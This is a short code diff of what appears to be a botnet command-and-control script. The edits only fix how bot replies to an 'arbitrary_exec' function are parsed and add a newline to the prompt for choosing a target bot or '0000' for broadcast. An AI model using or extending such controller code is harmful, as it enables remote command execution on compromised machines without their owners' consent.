@@ -160,7 +160,7 @@ def arbitrary_exec():
     while time.time() - start <= 180:
         for i in rx.messages:
             if i.finalized and i.payload[0] == "r" and i.payload[5:9] == "abx:":
-                print("Command output: {}".format(i.payload[8:]))
+                print("Command output: {}".format(i.payload[9:]))
                 rx.tlock.acquire()
                 rx.messages.remove(i)
                 rx.tlock.release()
@@ -214,7 +214,7 @@ def send(payload: str, target="0000"):
 
 def get_target():
     global botlist
-    print("Please enter the identifier of the bot to target or 0000 for broadcast.")
+    print("\nPlease enter the identifier of the bot to target or 0000 for broadcast.")
     print("You may also press enter to view the list of known bots.")
     selection = input("Identifier: ")
     if selection == "0000":
